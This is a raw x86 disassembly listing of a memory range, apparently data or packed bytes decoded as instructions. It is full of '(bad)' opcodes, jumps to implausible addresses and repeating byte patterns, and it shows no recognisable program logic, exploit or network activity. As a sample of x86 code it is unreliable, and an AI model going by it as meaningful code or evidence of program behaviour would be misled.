  41cd5d:	adc    DWORD PTR [edi-0x58],esp
  41cd60:	inc    eax
  41cd61:	fcmovnb st,st(4)
  41cd63:	dec    ebx
  41cd64:	lds    eax,FWORD PTR [edx]
  41cd66:	lods   eax,DWORD PTR ds:[esi]
  41cd67:	adc    DWORD PTR ds:0x542c00c0,eax
  41cd6d:	dec    esp
  41cd6e:	inc    edx
  41cd6f:	mov    al,0x40
  41cd71:	pusha  
  41cd72:	jae    0x41cdc6
  41cd74:	inc    ecx
  41cd75:	int    0xe5
  41cd77:	or     eax,0x4140ea04
  41cd7c:	aad    0x54
  41cd7e:	push   0x710340cb
  41cd83:	repnz ins BYTE PTR es:[edi],dx
  41cd85:	inc    esp
  41cd86:	mov    ah,0xb0
  41cd88:	inc    eax
  41cd89:	rol    DWORD PTR [eax-0x3c],0x63
  41cd8d:	repz inc esi
  41cd8f:	retf   
  41cd90:	and    eax,0x436241
  41cd95:	adc    BYTE PTR [eax+0x0],al
  41cd98:	add    eax,0x62410040
  41cd9d:	inc    eax
  41cd9e:	add    BYTE PTR [ebx-0x34],al
  41cda1:	inc    eax
  41cda2:	add    eax,0x78434040
  41cda7:	bound  eax,QWORD PTR [ecx+0x78]
  41cdaa:	add    eax,0x62404043
  41cdaf:	inc    eax
  41cdb0:	push   edi
  41cdb1:	jp     0x41ce02
  41cdb3:	lods   eax,DWORD PTR ds:[esi]
  41cdb4:	push   eax
  41cdb5:	pop    ecx
  41cdb6:	inc    ebp
  41cdb7:	adc    al,0xc0
  41cdb9:	dec    esp
  41cdba:	inc    ecx
  41cdbb:	into   
  41cdbc:	pop    edx
  41cdbd:	addr16 inc ecx
  41cdbf:	inc    eax
  41cdc0:	jo     0x110f96e4
  41cdc6:	fcomp  QWORD PTR [eax]
  41cdc8:	pop    ebx
  41cdc9:	add    esp,edx
  41cdcb:	lock pusha 
  41cdcd:	test   BYTE PTR [edx],dh
  41cdcf:	inc    eax
  41cdd0:	ret    0x633a
  41cdd3:	or     ch,bl
  41cdd5:	js     0x41cd70
  41cdd7:	adc    al,0x7f
  41cdd9:	inc    eax
  41cdda:	bound  esp,QWORD PTR cs:[esi+esi*1+0x55]
  41cddf:	inc    eax
  41cde0:	inc    ebp
  41cde1:	sub    DWORD PTR [eax+0x40054041],edi
  41cde7:	bound  eax,QWORD PTR [ebx+0x43]
  41cdea:	add    eax,0x62004040
  41cdef:	inc    eax
  41cdf0:	add    BYTE PTR [ecx+0x40],al
  41cdf3:	inc    ebx
  41cdf4:	test   BYTE PTR ds:0x58054041,ah
  41cdfa:	inc    eax
  41cdfb:	inc    eax
  41cdfc:	bound  eax,QWORD PTR [eax+0x66]
  41cdff:	inc    ecx
  41ce00:	inc    eax
  41ce01:	add    eax,0x44287b00
  41ce06:	ret    0xc06e
  41ce09:	dec    ebp
  41ce0a:	cdq    
  41ce0b:	cld    
  41ce0c:	cmp    BYTE PTR [edx+0xa94000],ch
  41ce12:	dec    esi
  41ce13:	bound  edx,QWORD PTR [esi-0x31]
  41ce16:	xor    al,0xe
  41ce18:	inc    eax
  41ce19:	ins    DWORD PTR es:[edi],dx
  41ce1a:	and    DWORD PTR [ecx],edx
  41ce1c:	inc    ebx
  41ce1d:	bound  eax,QWORD PTR [ebx+0x40]
  41ce20:	xchg   esp,eax
  41ce21:	add    BYTE PTR [eax],al
  41ce23:	inc    ebx
  41ce24:	inc    eax
  41ce25:	bound  eax,QWORD PTR ds:0x25404110
  41ce2b:	add    ah,cl
  41ce2d:	inc    ebx
  41ce2e:	add    eax,0x40402562
  41ce33:	add    BYTE PTR [eax+0x40],al
  41ce36:	inc    ecx
  41ce37:	inc    ecx
  41ce38:	add    eax,0x78434025
  41ce3d:	bound  eax,QWORD PTR [eax-0x7c]
  41ce40:	inc    eax
  41ce41:	inc    ecx
  41ce42:	pop    edi
  41ce43:	adc    BYTE PTR [esp+edx*8+0x330f9666],dl
  41ce4a:	add    DWORD PTR [eax],ebp
  41ce4c:	lahf   
  41ce4d:	mov    al,ds:0xf440523c
  41ce52:	jp     0x41ce4a
  41ce54:	es inc eax
  41ce56:	arpl   cx,cx
  41ce58:	or     ebx,eax
  41ce5a:	add    al,0xca
  41ce5c:	add    eax,0x40a86d35
  41ce61:	ds inc ecx
  41ce63:	inc    eax
  41ce64:	inc    eax
  41ce65:	inc    ebx
  41ce66:	int3   
  41ce67:	add    BYTE PTR ds:0x56240,al
  41ce6d:	inc    ebx
  41ce6e:	inc    eax
  41ce6f:	inc    eax
  41ce70:	add    BYTE PTR [ecx+0x62],al
  41ce73:	bound  eax,QWORD PTR [eax]
  41ce75:	int3   
  41ce76:	inc    eax
  41ce77:	inc    ebx
  41ce78:	add    eax,0x43624041
  41ce7d:	adc    BYTE PTR [ecx+0x5],al
  41ce80:	inc    eax
  41ce81:	jnp    0x41cee8
  41ce83:	retf   
  41ce84:	push   0xc81412fc
  41ce89:	push   esi
  41ce8a:	inc    edx
  41ce8b:	aad    0xe0
  41ce8d:	fs mov al,0x40
  41ce90:	xor    eax,DWORD PTR [eax+0x34]
  41ce93:	xchg   edx,eax
  41ce94:	jge    0x41ceeb
  41ce96:	adc    eax,0xeb043503
  41ce9b:	jo     0x41ce52
  41ce9d:	fmul   st(5),st
  41ce9f:	inc    eax
  41cea0:	ret    
  41cea1:	jo     0x41cf05
  41cea3:	inc    ebx
  41cea4:	inc    eax
  41cea5:	adc    BYTE PTR ds:0x4158cc40,al
  41ceab:	inc    ebx
  41ceac:	bound  eax,QWORD PTR [ecx+0x40]
  41ceaf:	add    eax,0x4140
  41ceb4:	and    eax,0x40400062
  41ceb9:	add    eax,0x84404340
  41cebe:	int3   
  41cebf:	js     0x41cec1
  41cec1:	inc    ecx
  41cec2:	adc    BYTE PTR [edx+0xf],ah
  41cec5:	and    dh,BYTE PTR [edx+eiz*2]
  41cec8:	repnz inc esp
  41ceca:	adc    eax,0x45e54044
  41cecf:	int    0xfc
  41ced1:	addr16 inc eax
  41ced3:	rol    BYTE PTR [eax],0x62
  41ced6:	ss mov eax,0x23120866
  41cedc:	js     0x41cf20
  41cede:	jbe    0x41ced9
  41cee0:	mov    edi,0x40334065
  41cee5:	xor    al,0x34
  41cee7:	adc    BYTE PTR [ecx+ecx*2+0x40414000],bh
  41ceee:	inc    ebx
  41ceef:	bound  ax,DWORD PTR ds:0x40434100
  41cef6:	add    eax,0x40054062
  41cefb:	bound  eax,QWORD PTR [ecx+0x40]
  41cefe:	inc    ebx
  41ceff:	inc    eax
  41cf00:	add    eax,0x25405841
  41cf05:	bound  eax,QWORD PTR [eax+0x43]
  41cf08:	inc    eax
  41cf09:	adc    BYTE PTR [edx+eax*8],dl
  41cf0c:	arpl   sp,dx
  41cf0e:	inc    ebp
  41cf0f:	push   eax
  41cf10:	inc    esi
  41cf11:	enter  0x2d40,0x40
  41cf15:	sub    BYTE PTR [esi],dh
  41cf17:	pusha  
  41cf18:	jo     0x41cf5c
  41cf1a:	adc    ebp,DWORD PTR [esi]
  41cf1c:	jp     0x41cf72
  41cf1e:	add    edx,DWORD PTR [esi+0x29400469]
  41cf24:	loopne 0x41ceb8
  41cf26:	stos   DWORD PTR es:[edi],eax
  41cf27:	arpl   WORD PTR [ecx+ebp*2+0x4573c20e],si
  41cf2e:	jo     0x41cf84
  41cf30:	(bad)  [eax+0x40]
  41cf33:	sub    eax,0x43414082
  41cf38:	inc    eax
  41cf39:	add    eax,0x43406262
  41cf3e:	inc    ecx
  41cf3f:	adc    BYTE PTR [eax],al
  41cf41:	inc    eax
  41cf42:	add    eax,0x43000562
  41cf47:	add    BYTE PTR [ecx+0x40],al
  41cf4a:	inc    eax
  41cf4b:	add    eax,0x400062
  41cf50:	inc    ebx
  41cf51:	inc    eax
  41cf52:	js     0x41cf95
  41cf54:	inc    ecx
  41cf55:	bound  eax,QWORD PTR [eax+0x38]
  41cf58:	(bad)  
  41cf59:	sbb    al,0xed
  41cf5b:	mov    bh,0x9
  41cf5d:	pop    edx
  41cf5e:	sub    al,0x81
  41cf60:	jo     0x41cf83
  41cf62:	ins    BYTE PTR es:[edi],dx
  41cf63:	push   esp
  41cf64:	inc    eax
  41cf65:	rol    ch,0xa8
  41cf68:	cmp    al,0x53
  41cf6a:	push   esp
  41cf6b:	(bad)  
  41cf6c:	pop    ds
  41cf6d:	add    eax,DWORD PTR [ecx]
  41cf6f:	adc    BYTE PTR [ebp-0x6c],ah
  41cf72:	fist   DWORD PTR [eax+0x40]
  41cf75:	inc    ecx
  41cf76:	inc    ebp
  41cf77:	mov    ah,0x6d
  41cf79:	fsub   st(5),st
  41cf7b:	inc    eax
  41cf7c:	adc    al,0xc5
  41cf7e:	add    DWORD PTR [ecx+0x38],eax
  41cf81:	bound  esp,QWORD PTR [ebx-0x57]
  41cf84:	bound  eax,QWORD PTR [eax+0x5]
  41cf87:	inc    ecx
  41cf88:	add    BYTE PTR [ebx+0x40],al
  41cf8b:	inc    eax
  41cf8c:	inc    ecx
  41cf8d:	inc    eax
  41cf8e:	inc    eax
  41cf8f:	bound  eax,QWORD PTR ds:0x5624300
  41cf95:	add    BYTE PTR [eax+0x40],al
  41cf98:	add    BYTE PTR [ecx+0x43],al
  41cf9b:	add    BYTE PTR [eax+0x41],al
  41cf9e:	add    eax,0x40436200
  41cfa3:	inc    eax
  41cfa4:	add    eax,0x792d4062
  41cfa9:	push   esp
  41cfaa:	and    BYTE PTR [ecx+edx*1],bl
  41cfad:	addr16 adc dl,al
  41cfb0:	adc    eax,0xa724fe29
  41cfb6:	inc    eax
  41cfb7:	outs   dx,BYTE PTR ds:[esi]
  41cfb8:	pusha  
  41cfb9:	shr    BYTE PTR [eax+0x194763a8],1
  41cfbf:	push   ss
  41cfc0:	add    BYTE PTR [edx+0x12],0x10
  41cfc4:	push   edi
  41cfc5:	sub    DWORD PTR [eax+0x0],eax
  41cfc8:	xor    al,0xd1
  41cfca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfcb:	mov    ah,0x44
  41cfcd:	inc    ecx
  41cfce:	inc    eax
  41cfcf:	add    eax,0x41624340
  41cfd4:	test   BYTE PTR [eax],al
  41cfd6:	and    eax,0x404043
  41cfdb:	add    BYTE PTR ds:0x626210,al
  41cfe1:	add    eax,0x43404140
  41cfe6:	inc    eax
  41cfe7:	inc    ecx
  41cfe8:	add    eax,0x10664062
  41cfed:	inc    ebx
  41cfee:	bound  ebp,QWORD PTR [edi+0x12]
  41cff1:	shr    DWORD PTR [edx+0x6c],0x42
  41cff5:	inc    edx
  41cff6:	add    DWORD PTR [eax],esi
  41cff8:	inc    eax
  41cff9:	outs   dx,BYTE PTR ds:[esi]
  41cffa:	add    DWORD PTR [ecx-0xa],ebx
  41cffd:	sub    eax,0xc203ca67
  41d002:	std    
  41d003:	fcom   DWORD PTR [esp+ebp*8+0x2140c46f]
  41d00a:	inc    ecx
  41d00b:	xor    DWORD PTR [edx+0x62],esp
  41d00e:	test   al,0x4f
  41d010:	add    eax,0xd2f0020
  41d015:	or     dl,BYTE PTR [ecx]
  41d017:	dec    eax
  41d018:	inc    eax
  41d019:	shl    DWORD PTR [edx],0x42
  41d01c:	pop    ebp
  41d01d:	xor    BYTE PTR [eax+0x505704bb],bh
  41d023:	sar    BYTE PTR ds:0x4041cc05,cl
  41d029:	add    BYTE PTR [eax],al
  41d02b:	add    BYTE PTR [eax+0x40],al
  41d02e:	inc    ebx
  41d02f:	bound  eax,QWORD PTR [eax]
  41d031:	inc    eax
  41d032:	inc    eax
  41d033:	add    eax,0x62434162
  41d038:	inc    eax
  41d039:	js     0x41d04b
  41d03b:	inc    ecx
  41d03c:	add    eax,0x5404325
  41d041:	bound  eax,QWORD PTR [eax+0x40]
  41d044:	inc    ecx
  41d045:	inc    ebx
  41d046:	xchg   ecx,eax
  41d047:	inc    ecx
  41d048:	pop    ebx
  41d049:	inc    eax
  41d04a:	rol    DWORD PTR [eax-0x1a477f93],0xa8
  41d051:	inc    eax
  41d052:	jg     0x41d0b6
  41d054:	sahf   
  41d055:	sub    BYTE PTR ds:0xc54042b4,cl
  41d05b:	inc    eax
  41d05c:	mov    al,0x62
  41d05e:	retf   
  41d05f:	arpl   WORD PTR [edx],bp
  41d061:	and    al,0x25
  41d063:	inc    ecx
  41d064:	bound  eax,QWORD PTR [ebx+0x0]
  41d067:	adc    BYTE PTR [eax+0x0],al
  41d06a:	add    eax,0x62410040
  41d06f:	inc    eax
  41d070:	add    BYTE PTR [ebx-0x34],al
  41d073:	inc    eax
  41d074:	add    eax,0x78434040
  41d079:	bound  eax,QWORD PTR [ecx+0x78]
  41d07c:	add    eax,0x62404043
  41d081:	jbe    0x41d100
  41d083:	test   al,0x35
  41d085:	inc    ecx
  41d086:	jg     0x41d09a
  41d088:	inc    eax
  41d089:	lds    eax,FWORD PTR [eax+0x11]
  41d08c:	inc    eax
  41d08d:	sub    ah,bh
  41d08f:	mov    eax,0xb4336840
  41d094:	xchg   esp,eax
  41d095:	enter  0x1562,0x40
  41d099:	ret    
  41d09a:	loopne 0x41d0de
  41d09c:	cmp    eax,0x23440b53
  41d0a1:	lahf   
  41d0a2:	jns    0x41d0c8
  41d0a4:	ret    
  41d0a5:	dec    edi
  41d0a6:	xchg   esp,eax
  41d0a7:	inc    ecx
  41d0a8:	inc    eax
  41d0a9:	js     0x41d0ad
  41d0ab:	call   0x58a3d118
  41d0b0:	inc    eax
  41d0b1:	leave  
  41d0b2:	inc    ecx
  41d0b3:	inc    eax
  41d0b4:	add    eax,0x43436240
  41d0b9:	add    eax,0x62004040
  41d0be:	inc    eax
  41d0bf:	add    BYTE PTR [ecx+0x40],al
  41d0c2:	inc    ebx
  41d0c3:	test   BYTE PTR ds:0x58054041,ah
  41d0c9:	inc    eax
  41d0ca:	inc    eax
  41d0cb:	bound  eax,QWORD PTR [eax+0x66]
  41d0ce:	inc    ecx
  41d0cf:	inc    eax
  41d0d0:	add    eax,0x35622c00
  41d0d5:	or     DWORD PTR [edi+eiz*2+0x40],esp
  41d0d9:	jmp    0x65822001
  41d0de:	cwde   
  41d0df:	retf   
  41d0e0:	and    al,BYTE PTR [ecx-0x7e]
  41d0e3:	dec    eax
  41d0e4:	cwde   
  41d0e5:	pop    esp
  41d0e6:	bound  ecx,QWORD PTR [ebx]
  41d0e8:	inc    eax
  41d0e9:	pop    ebp
  41d0ea:	ss push edx
  41d0ec:	cmp    eax,0x40fd48dc
  41d0f1:	inc    ecx
  41d0f2:	cmp    BYTE PTR [edx-0x3d],al
  41d0f5:	jmp    0x41d10f
  41d0f7:	add    eax,0x72822740
  41d0fc:	xor    DWORD PTR [ecx],edx
  41d0fe:	ins    BYTE PTR es:[edi],dx
  41d0ff:	enter  0x4121,0x7c
  41d103:	les    esi,FWORD PTR ds:0x430000c4
  41d109:	inc    eax
  41d10a:	bound  eax,QWORD PTR ds:0x25404110
  41d110:	add    ah,cl
  41d112:	inc    ebx
  41d113:	add    eax,0x40402562
  41d118:	add    BYTE PTR [eax+0x40],al
  41d11b:	inc    ecx
  41d11c:	inc    ecx
  41d11d:	add    eax,0x78434025
  41d122:	bound  eax,QWORD PTR [eax-0x7c]
  41d125:	inc    eax
  41d126:	inc    ecx
  41d127:	add    al,0x62
  41d129:	inc    eax
  41d12a:	test   eax,0x264d4f14
  41d12f:	mov    ds:0x11414041,al
  41d134:	inc    ecx
  41d135:	data16 arpl WORD PTR ds:0x12614058,di
  41d13c:	aad    0x38
  41d13e:	sbb    eax,0x40506a62
  41d143:	add    eax,0xb8ec9024
  41d148:	add    al,BYTE PTR [eax+0x2e]
  41d14b:	jmp    0x41d1b0
  41d14d:	inc    ebx
  41d14e:	push   edx
  41d14f:	add    eax,0xd8540aa
  41d154:	sbb    al,0xc5
  41d156:	les    eax,FWORD PTR [ecx+0x40]
  41d159:	inc    eax
  41d15a:	inc    ebx
  41d15b:	int3   
  41d15c:	add    BYTE PTR ds:0x56240,al
  41d162:	inc    ebx
  41d163:	inc    eax
  41d164:	inc    eax
  41d165:	add    BYTE PTR [ecx+0x62],al
  41d168:	bound  eax,QWORD PTR [eax]
  41d16a:	int3   
  41d16b:	inc    eax
  41d16c:	inc    ebx
  41d16d:	add    eax,0x43624041
  41d172:	adc    BYTE PTR [ecx+0x5],al
  41d175:	inc    eax
  41d176:	imul   esi,DWORD PTR ds:0x840b4140,0xffffffc0
  41d17d:	dec    edi
  41d17e:	dec    esp
  41d17f:	inc    ecx
  41d180:	inc    esp
  41d181:	mov    ebp,0xac436246
  41d186:	add    eax,0x7f4058
  41d18b:	ins    DWORD PTR es:[edi],dx
  41d18c:	and    eax,0x4069cb15
  41d191:	inc    edi
  41d192:	cs cli 
  41d194:	xor    eax,0x40720fc9
  41d199:	mov    ebx,DWORD PTR [edx-0x58]
  41d19c:	bound  eax,QWORD PTR [ebx+0x40]
  41d19f:	adc    BYTE PTR ds:0x4158cc40,al
  41d1a5:	inc    ebx
  41d1a6:	bound  eax,QWORD PTR [ecx+0x40]
  41d1a9:	add    eax,0x4140
  41d1ae:	and    eax,0x40400062
  41d1b3:	add    eax,0x84404340
  41d1b8:	int3   
  41d1b9:	js     0x41d1bb
  41d1bb:	inc    ecx
  41d1bc:	adc    BYTE PTR [edx+0xf],ah
  41d1bf:	push   0x436044a0
  41d1c4:	inc    edx
  41d1c5:	add    BYTE PTR [eax+0x21],0x15
  41d1c9:	push   ebx
  41d1ca:	rol    DWORD PTR [eax+0x2d],1
  41d1cd:	outs   dx,DWORD PTR ds:[esi]
  41d1ce:	inc    eax
  41d1cf:	arpl   WORD PTR [ebx+0x28],ax
  41d1d2:	bound  eax,QWORD PTR [eax+0xf]
  41d1d5:	inc    eax
  41d1d6:	inc    edx
  41d1d7:	pop    ds
  41d1d8:	push   esp
  41d1d9:	mov    eax,ds:0x7c424048
  41d1de:	pop    es
  41d1df:	inc    eax
  41d1e0:	inc    esi
  41d1e1:	sar    al,1
  41d1e3:	add    BYTE PTR [eax+0x41],al
  41d1e6:	inc    eax
  41d1e7:	inc    ebx
  41d1e8:	bound  ax,DWORD PTR ds:0x40434100
  41d1ef:	add    eax,0x40054062
  41d1f4:	bound  eax,QWORD PTR [ecx+0x40]
  41d1f7:	inc    ebx
  41d1f8:	inc    eax
  41d1f9:	add    eax,0x25405841
  41d1fe:	bound  eax,QWORD PTR [eax+0x43]
  41d201:	inc    eax
  41d202:	adc    BYTE PTR [edx+0x33],al
  41d205:	or     al,0xa9
  41d207:	bound  edi,QWORD PTR [edi+edx*8]
  41d20a:	push   edx
  41d20b:	inc    eax
  41d20c:	dec    edi
  41d20d:	mov    esp,DWORD PTR [esp+edi*4+0x40c8fba4]
  41d214:	inc    esp
  41d215:	xchg   ecx,eax
  41d216:	add    eax,0x22b96263
  41d21b:	inc    eax
  41d21c:	inc    ecx
  41d21d:	inc    ebx
  41d21e:	inc    eax
  41d21f:	add    eax,0x43406262
  41d224:	inc    ecx
  41d225:	adc    BYTE PTR [eax],al
  41d227:	inc    eax
  41d228:	add    eax,0x43000562
  41d22d:	add    BYTE PTR [ecx+0x40],al
  41d230:	inc    eax
  41d231:	add    eax,0x400062
  41d236:	inc    ebx
  41d237:	inc    eax
  41d238:	js     0x41d27b
  41d23a:	inc    ecx
  41d23b:	bound  eax,QWORD PTR [eax+0x40]
  41d23e:	sub    ah,BYTE PTR [ebx-0x35]
  41d241:	jno    0x41d2ad
  41d243:	push   0x1494155
  41d248:	dec    eax
  41d249:	bound  ebp,QWORD PTR [eax]
  41d24b:	mov    esp,0x4d424039
  41d250:	dec    ecx
  41d251:	xchg   ecx,eax
  41d252:	push   esi
  41d253:	add    eax,0x9540b8
  41d258:	and    al,0xcc
  41d25a:	mov    ah,0xff
  41d25c:	loopne 0x41d29e
  41d25e:	xor    al,0x38
  41d260:	mov    esp,0x55e254dd
  41d265:	inc    ecx
  41d266:	out    0x40,eax
  41d268:	fs enter 0x47d2,0x62
  41d26d:	inc    eax
  41d26e:	inc    ecx
  41d26f:	and    eax,0xf0a84458
  41d274:	bound  eax,QWORD PTR [eax+0x5]
  41d277:	inc    ecx
  41d278:	add    BYTE PTR [ebx+0x40],al
  41d27b:	inc    eax
  41d27c:	inc    ecx
  41d27d:	inc    eax
  41d27e:	inc    eax
  41d27f:	bound  eax,QWORD PTR ds:0x5624300
  41d285:	add    BYTE PTR [eax+0x40],al
  41d288:	add    BYTE PTR [ecx+0x43],al
  41d28b:	add    BYTE PTR [eax+0x41],al
  41d28e:	add    eax,0x40436200
  41d293:	inc    eax
  41d294:	add    eax,0x69404462
  41d299:	(bad)  
  41d29a:	fsub   QWORD PTR ds:0x40686711
  41d2a0:	inc    edx
  41d2a1:	mov    edx,eax
  41d2a3:	iret   
  41d2a4:	adc    BYTE PTR [eax],bh
  41d2a6:	add    DWORD PTR [ebx+0x30],eax
  41d2a9:	jne    0x41d307
  41d2ab:	jg     0x41d2ee
  41d2ad:	stos   DWORD PTR es:[edi],eax
  41d2ae:	arpl   WORD PTR [eax+0x5f],ax
  41d2b1:	add    DWORD PTR [ebp+0x11],esp
  41d2b4:	mov    eax,0x444092b4
  41d2b9:	inc    ecx
  41d2ba:	inc    eax
  41d2bb:	add    eax,0x41624340
  41d2c0:	test   BYTE PTR [eax],al
  41d2c2:	and    eax,0x404043
  41d2c7:	add    BYTE PTR ds:0x626210,al
  41d2cd:	add    eax,0x43404140
  41d2d2:	inc    eax
  41d2d3:	inc    ecx
  41d2d4:	add    eax,0x10664062
  41d2d9:	inc    ebx
  41d2da:	bound  edx,QWORD PTR [esp+eiz*2]
  41d2dd:	(bad)  
  41d2de:	lock add eax,0xc52440a8
  41d2e4:	imul   ecx,ebx,0x52
  41d2e7:	retf   
  41d2e8:	arpl   WORD PTR [eax+0x19],ax
  41d2eb:	xchg   ebp,ebx
  41d2ed:	pop    es
  41d2ee:	retf   
  41d2ef:	inc    ebp
  41d2f0:	xor    BYTE PTR ss:[edx+0x62],al
  41d2f4:	xor    dh,BYTE PTR [ecx]
  41d2f6:	mov    al,0x43
  41d2f8:	(bad)  
  41d2f9:	jmp    0x4315:0xe9a4c230
  41d300:	in     eax,dx
  41d301:	je     0x41d32d
  41d303:	xor    eax,0x4041cc05
  41d308:	add    BYTE PTR [eax],al
  41d30a:	add    BYTE PTR [eax+0x40],al
  41d30d:	inc    ebx
  41d30e:	bound  eax,QWORD PTR [eax]
  41d310:	inc    eax
  41d311:	inc    eax
  41d312:	add    eax,0x62434162
  41d317:	inc    eax
  41d318:	js     0x41d32a
  41d31a:	inc    ecx
  41d31b:	add    eax,0x5404325
  41d320:	bound  eax,QWORD PTR [eax+0x40]
  41d323:	inc    ecx
  41d324:	inc    ebx
  41d325:	push   ax
  41d327:	gs cmp al,0xe8
  41d32a:	std    
  41d32b:	dec    ecx
  41d32c:	pop    esi
  41d32d:	and    BYTE PTR [edx+0x2f],0x75
  41d331:	(bad)  
  41d332:	test   DWORD PTR [eax-0x40],0x50854473
  41d339:	imul   ecx,edx,0x3a
  41d33c:	and    eax,DWORD PTR [edx-0x28]
  41d33f:	imul   ebx,esp,0xcac5802c
  41d345:	jns    0x41d394
  41d347:	and    eax,0x436241
  41d34c:	adc    BYTE PTR [eax+0x0],al
  41d34f:	add    eax,0x62410040
  41d354:	inc    eax
  41d355:	add    BYTE PTR [ebx-0x34],al
  41d358:	inc    eax
  41d359:	add    eax,0x78434040
  41d35e:	bound  eax,QWORD PTR [ecx+0x78]
  41d361:	add    eax,0x62404043
  41d366:	fstp   QWORD PTR [ebx+0x41]
  41d369:	dec    ecx
  41d36a:	inc    ebx
  41d36b:	shl    edi,0x45
  41d36e:	and    eax,0x2971bcbc
  41d373:	in     eax,dx
  41d374:	pop    esp
  41d375:	aad    0xd0
  41d377:	push   esp
  41d378:	popa   
  41d379:	in     al,dx
  41d37a:	inc    ebx
  41d37b:	leave  
  41d37c:	mov    al,0x68
  41d37e:	dec    esp
  41d37f:	cwde   
  41d380:	leave  
  41d381:	add    eax,0x44536121
  41d386:	inc    ebp
  41d387:	imul   esi,DWORD PTR [ebp+0x49],0x43
  41d38b:	rcl    DWORD PTR [eax+0x38],0x7d
  41d38f:	sbb    bl,dl
  41d391:	(bad)  
  41d392:	cmovbe eax,DWORD PTR [eax-0xf]
  41d396:	inc    ecx
  41d397:	inc    eax
  41d398:	add    eax,0x43436240
  41d39d:	add    eax,0x62004040
  41d3a2:	inc    eax
  41d3a3:	add    BYTE PTR [ecx+0x40],al
  41d3a6:	inc    ebx
  41d3a7:	test   BYTE PTR ds:0x58054041,ah
  41d3ad:	inc    eax
  41d3ae:	inc    eax
  41d3af:	bound  eax,QWORD PTR [eax+0x66]
  41d3b2:	inc    ecx
  41d3b3:	inc    eax
  41d3b4:	add    eax,0x506c4400
  41d3b9:	add    al,BYTE PTR [edx-0x40]
  41d3bc:	adc    DWORD PTR [eax+eiz*2+0x53],ebp
  41d3c0:	xor    eax,0x6bef36be
  41d3c5:	aad    0x69
  41d3c7:	fild   WORD PTR [eax+0x11335541]
  41d3cd:	adc    BYTE PTR [esi*4+0x454140c5],dh
  41d3d4:	inc    edx
  41d3d5:	xchg   esp,eax
  41d3d6:	lods   eax,DWORD PTR gs:[esi]
  41d3d8:	inc    ecx
  41d3d9:	inc    eax
  41d3da:	std    
  41d3db:	shl    DWORD PTR [ecx],0x1c
  41d3de:	push   0x5405862
  41d3e3:	jge    0x41d3b0
  41d3e5:	es ins BYTE PTR es:[edi],dx
  41d3e7:	out    0xc8,al
  41d3e9:	dec    esp
  41d3ea:	add    BYTE PTR [eax],al
  41d3ec:	inc    ebx
  41d3ed:	inc    eax
  41d3ee:	bound  eax,QWORD PTR ds:0x25404110
  41d3f4:	add    ah,cl
  41d3f6:	inc    ebx
  41d3f7:	add    eax,0x40402562
  41d3fc:	add    BYTE PTR [eax+0x40],al
  41d3ff:	inc    ecx
  41d400:	inc    ecx
  41d401:	add    eax,0x78434025
  41d406:	bound  eax,QWORD PTR [eax-0x7c]
  41d409:	inc    eax
  41d40a:	inc    ecx
  41d40b:	inc    eax
  41d40c:	ret    
  41d40d:	adc    ah,BYTE PTR [edx+0x65]
  41d410:	clc    
  41d411:	bound  eax,QWORD PTR [eax+0x31]
  41d414:	(bad)  [edx+edx*1-0x4]
  41d418:	cmp    al,0x39
  41d41a:	inc    eax
  41d41b:	pop    ss
  41d41c:	(bad)  
  41d41d:	sbb    bh,BYTE PTR [eax+0x40a8cc54]
  41d423:	inc    ecx
  41d424:	retf   
  41d425:	jmp    0x41d407
  41d427:	push   edx
  41d428:	arpl   WORD PTR [edx+0x58],sp
  41d42b:	dec    ebx
  41d42c:	inc    ecx
  41d42d:	inc    eax
  41d42e:	inc    eax
  41d42f:	inc    ebx
  41d430:	int3   
  41d431:	add    BYTE PTR ds:0x56240,al
  41d437:	inc    ebx
  41d438:	inc    eax
  41d439:	inc    eax
  41d43a:	add    BYTE PTR [ecx+0x62],al
  41d43d:	bound  eax,QWORD PTR [eax]
  41d43f:	int3   
  41d440:	inc    eax
  41d441:	inc    ebx
  41d442:	add    eax,0x43624041
  41d447:	adc    BYTE PTR [ecx+0x5],al
  41d44a:	inc    eax
  41d44b:	lds    esp,FWORD PTR [esi+0x26]
  41d44e:	inc    ebp
  41d44f:	ret    0x4033
  41d452:	inc    eax
  41d453:	sub    eax,0x207c6ec8
  41d458:	jae    0x41d49a
  41d45a:	xor    eax,edx
  41d45c:	inc    ebp
  41d45d:	dec    ecx
  41d45e:	inc    ebx
  41d45f:	or     esp,DWORD PTR [edi+0x40]
  41d462:	xor    bh,BYTE PTR ss:[ecx]
  41d465:	lds    esp,FWORD PTR [eax-0x6c]
  41d468:	and    eax,0x26064054
  41d46d:	je     0x41d41b
  41d46f:	bound  esp,QWORD PTR [edx+0x40]
  41d472:	sub    dl,al
  41d474:	and    dh,BYTE PTR [ebx+eax*8]
  41d477:	or     eax,0x3d404034
  41d47c:	bound  eax,QWORD PTR [ebx+0x40]
  41d47f:	adc    BYTE PTR ds:0x4158cc40,al
  41d485:	inc    ebx
  41d486:	bound  eax,QWORD PTR [ecx+0x40]
  41d489:	add    eax,0x4140
  41d48e:	and    eax,0x40400062
  41d493:	add    eax,0x84404340
  41d498:	int3   
  41d499:	js     0x41d49b
  41d49b:	inc    ecx
  41d49c:	adc    BYTE PTR [edx+0xf],ah
  41d49f:	cmp    eax,0x2865f14f
  41d4a4:	inc    eax
  41d4a5:	hlt    
  41d4a6:	xor    esp,DWORD PTR [edx-0x4a]
  41d4a9:	fidiv  WORD PTR [ecx]
  41d4ab:	arpl   WORD PTR [eax+0x23],dx
  41d4ae:	jecxz  0x41d4e3
  41d4b0:	pop    edx
  41d4b1:	cwde   
  41d4b2:	push   edi
  41d4b3:	test   eax,0x40002e40
  41d4b8:	inc    ecx
  41d4b9:	inc    eax
  41d4ba:	inc    ebx
  41d4bb:	bound  ax,DWORD PTR ds:0x40434100
  41d4c2:	add    eax,0x40054062
  41d4c7:	bound  eax,QWORD PTR [ecx+0x40]
  41d4ca:	inc    ebx
  41d4cb:	inc    eax
  41d4cc:	add    eax,0x25405841
  41d4d1:	bound  eax,QWORD PTR [eax+0x43]
  41d4d4:	inc    eax
  41d4d5:	adc    ch,al
  41d4d7:	and    BYTE PTR [esp+esi*4],ch
  41d4da:	dec    ebx
  41d4db:	test   al,0x40
  41d4dd:	inc    ecx
  41d4de:	fisub  WORD PTR [edx+0x5e]
  41d4e1:	ins    BYTE PTR es:[edi],dx
  41d4e2:	and    eax,0xc4464042
  41d4e7:	int3   
  41d4e8:	cwde   
  41d4e9:	frstor [ecx]
  41d4eb:	sub    cl,BYTE PTR [eax+eax*2+0x2c]
  41d4ef:	sub    BYTE PTR [ecx-0x68],cl
  41d4f2:	add    al,0x10
  41d4f4:	inc    eax
